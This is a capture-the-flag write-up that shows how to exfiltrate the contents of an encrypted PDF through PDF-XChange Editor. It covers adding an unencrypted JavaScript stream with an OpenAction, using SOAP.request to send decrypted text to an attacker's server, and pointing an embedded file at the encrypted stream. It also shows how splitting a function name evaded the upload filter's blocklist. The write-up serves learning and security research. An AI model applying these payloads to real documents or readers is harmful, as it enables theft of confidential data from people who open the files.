# PDF-Xfiltration

> Try to steal data from Dr. Virus to understand what's happening to your brother.

The description also links to a webpage with a lengthy lore, but TLDR:
- we are given an encrypted PDF file,
- our task is to read it contents,
- we can upload a PDF file in a provided web app,
- the uploaded PDF will be opened by a bot in a PDF-XChange Editor in version 7.0.326.1.

First we looked at the PDF-XChange editor changelog at
https://www.tracker-software.com/product/pdf-xchange-editor/history and found our that the next version had a following
vulnerability fixed:

> The Editor, and our other products that work with XMP, are now not affected by the "Billion laughs attack".

The attached support board thread had a PoC attached with an XXE vulnerability in XMP metadata. We've tried with this
approach for a while, but it either didn't work or the upload webpage refused to accept our PDF file:

```
Error on upload: XXE attack attempt detected. This is not the right path.
```

We've even obfuscted the XML XMP metadata stream using a `/ASCIIHexDecode` filter, but guess what... **it wasn't the
right path**. It was even possible that the PDF password to the provided encrypted PDF wasn't stored in a filesystem, so
XXE approach wouldn't help us anyway.

Our next idea was to prepare a PDF file with an interactive text input and an attached script that would send us the
result. If the bot was programmed to input a password in a dialog and pressing [enter] that would possibly send us the 
password. The form submit would display a warning and ask the user if it wants to send us the form, but we
reckoned that it might be automatically accepted when the bot would press [enter]. Sadly, it just didn't work.

Back to the drawing board... and a lot of Google searching, which fortunately was quite fruitful. We came upon a paper
describing, what basically is, a solution to our challenge: exfiltrating an encrypted content from a maliciously
modified PDF upon opening it.

We recommend everyone to read it in full: https://pdf-insecurity.org/download/paper-pdf_encryption-ccs2019.pdf. That's
some really cool research!

So the main issue with PDF encryption is that only parts of it are encrypted and the rest isn't authenticated at all. We 
can modify all the unencrypted parts as we wish and even add our own, unencrypted objects. The idea is to add a custom
JavaScript code that upon opening and decrypting data would send it back to us.

The basic structure of a PDF file is that it consists of objects with their attributes and data in form of strings
and streams (binary data). Our provided PDF file looks like this:

```
%PDF-1.7
%����
1 0 obj
<< /PageLayout /OneColumn /Pages 4 0 R /Type /Catalog >>
endobj
2 0 obj
<< /CreationDate <5052dd9f3a4e02156dad8653cdaebd0ec9924e398fb069b7a68e1ed3cd9f75605d2a95540b770dd7919dd6ed943b1c77> /Producer <1c1a1e2d0766c0ecdfad3c10ce7deb030e3a69c2bcd4267ca67f9e681344e55159a02e86b7ef87678e7b2c12052acfdea82cd1f08237e293cdb84a4310a59a30> >>
endobj
3 0 obj
<< /Contents 5 0 R /MediaBox 6 0 R /Parent 4 0 R /Resources 7 0 R /Type /Page >>
endobj
```

...

```
5 0 obj
<< /Filter /FlateDecode /Length 272 >>
stream
�1@������l��W���X�&]L=~/� ... binary data ... ��}}8��a�7���O� 4�<��8� �q��9�
endstream
endobj
```

...

```
9 0 obj
<< /CF << /StdCF << /AuthEvent /DocOpen /CFM /AESV3 /Length 32 >> >> /Filter /Standard /Length 256 /O <c37e813188aee0710d84780cdbd8f5911de08ad42e126bd25c7333caf4540eddf5206f6a77d78ecad15e92cb7d1eefe2> /OE <47892a2defde16d7c57eb11f414f6da78f0464984b0e95cbc8d17a8c720b9fcd> /P -1028 /Perms <0169d0437c42dabefbcd653efced456b> /R 6 /StmF /StdCF /StrF /StdCF /U <3c9aa6a28f972b072f290ae4781ab76ae1335bcfd46dc00f1c4dd24e65ea8986e9179277232bfd7462c44640382f8a9b> /UE <6c3394663ab0ce631d011e61a7891f3da2e9c9bdc22a3dde8d1efd6db0c0ceec> /V 5 >>
endobj
xref
0 10
0000000000 65535 f 
0000000015 00000 n 
0000000087 00000 n 
0000000362 00000 n 
0000000458 00000 n 
0000000517 00000 n 
0000000861 00000 n 
0000000898 00000 n 
0000001004 00000 n 
0000001101 00000 n 
trailer << /Info 2 0 R /Root 1 0 R /Size 10 /ID [<25577b924d52c40dabeb58264f356ef8><25577b924d52c40dabeb58264f356ef8>] /Encrypt 9 0 R >>
startxref
1651
%%EOF
```

So we have 9 objects and one of them, the 5th one is a stream with some binary data. The trailer at the end of the file
is the first thing that PDF readers process. The most important thing is the `/Root 1 0 R` which tells the reader that
the document root is in the 1st object, and, in our case, the `/Encrypt 9 0 R` which tells us the document is encrypted
and the details are specified in the 9th object.

```
9 0 obj
<< /CF << /StdCF << /AuthEvent /DocOpen /CFM /AESV3 /Length 32 >> >> /Filter /Standard /Length 256 /O <c37e813188aee0710d84780cdbd8f5911de08ad42e126bd25c7333caf4540eddf5206f6a77d78ecad15e92cb7d1eefe2> /OE <47892a2defde16d7c57eb11f414f6da78f0464984b0e95cbc8d17a8c720b9fcd> /P -1028 /Perms <0169d0437c42dabefbcd653efced456b> /R 6 /StmF /StdCF /StrF /StdCF /U <3c9aa6a28f972b072f290ae4781ab76ae1335bcfd46dc00f1c4dd24e65ea8986e9179277232bfd7462c44640382f8a9b> /UE <6c3394663ab0ce631d011e61a7891f3da2e9c9bdc22a3dde8d1efd6db0c0ceec> /V 5 >>
endobj
```

The attributes specify when the app should ask for a password, what the encryption algorithm is and its parameters
and whether it should consider that strings, streams and embedded files as encrypted or not. In our case, all of them
should be encrypted. That's not helpful, because we must add our JavaScript code and it has to be provided as either
string or a stream. As it turns out, both the PDF standard and different implementation quirks in various reader apps
allow us to have just that. In case of PDF-XChange Editor we can add a filter attribute to a stream specyfing that it
uses a special encryption algorithm: "Identity", so no encryption at all.

So let's add a new, unencrypted, object to our PDF file:

```
10 0 obj
    << /Filter [/Crypt] /DecodeParms [<< /Name /Identity >>]
       /Length 25
    >>
stream
console.println("hello");
endstream
endobj
```

That by itself isn't going to execute the JavaScript code. We need to add a reference to it in the catalog object.

So we change the 1st object from:  

```
<< /PageLayout /OneColumn /Pages 4 0 R /Type /Catalog >>
```

to

```
<< /PageLayout /OneColumn /Pages 4 0 R /Type /Catalog /OpenAction << /JS 10 0 R /S /JavaScript >> >>
```

The added `/OpenAction` specifies we want to execute JavaScript code from the 10th object upon opening the document.

Now that we can execute our code, we need an exfiltration method. Existing research describes a few possible exfiltration
methods. Preferably we'd want a 0-click way to send a network request and after testing several approaches we find that
we can use `SOAP.request('http://server/', [])` to send an HTTP request without triggering any warnings or dialogs in the 
application.

We've submitted the PDF with these changes, and, voilà, soon we've noticed an incoming HTTP request. Great.

So how do we exfiltrate data from the now decrypted 5th stream? Again, there are several documented approaches.
At first, we've used the simplest and pure-JavaScript method using the `getPageNthWord()` function. We've got the
following request:

```
GET /Patient,Details,Name,Alfonso,Manfreso,DOB,03,15,1959,Gender,M,Patient,ID,15646548,Results,to,the,COVID,test,INS,PDF,NCrypt,0n,BYp,ss,Thr0uGh,D,r3ct,3xf1ltRat1oN?WSDL HTTP/1.1
```

We kinda see the flag there: `INS,PDF,NCrypt,0n,BYp,ss,Thr0uGh,D,r3ct,3xf1ltRat1oN`, but it's missing all of special
characters. We've tried to figure them out, but resigned after a few failed submissions.

We can't directly access streams from the JavaScript API, but we can define two types of objects: annotations and embedded files that:
- can be accessed from the JavaScript API,
- their contents can be pointed to another stream.

First we tried annotations, but we found that the upload form blocked all PDFs with the needed parameter keyword `/Annots`.
So we were left with embedded files. Once again we can add their definitions to the catalog.

We change it from the previously modified version of:
```
<< /PageLayout /OneColumn /Pages 4 0 R /Type /Catalog /OpenAction << /JS 10 0 R /S /JavaScript >> >>
```

to

```
<< /PageLayout /OneColumn /Pages 4 0 R /Type /Catalog /OpenAction << /JS 10 0 R /S /JavaScript >> /Names << /EmbeddedFiles << /Names [(x) << /EF << /F 5 0 R >> >> ] >> >> >>
```

The added `/Names << /EmbeddedFiles << /Names [(x) << /EF << /F 5 0 R >> >> ] >>` specify an embedded file of name "x"
with contents of stream in 5th object.

It's content can be accessed in JavaScript with: `util.stringFromStream(this.getDataObjectContents("x",true));`.

Once again the upload form tried to annoy us with blacklisting the function name, but this time we've got several options
to obfuscate the code. The simplest `util.stringFromStream(this["getDat" + "aObje" + "ctContents"]("x",true))` did the work.

We sent the final payload and got the complete flag in the incoming HTTP request: `INS{PDF_#NCrypt!0n_BYp@ss_Thr0uGh_D/r3ct_3xf1ltRat1oN}`

The challenge would have been a lot easier if we'd also found PoCs attached with the original paper on PDF exfiltration,
but at least that forced us to learn a lot about PDF internals :).

[We also provide the complete Python script making the nessesary modifications](./kodzik.py) with the [original](./original.pdf) and [final](final.pdf) PDF files.
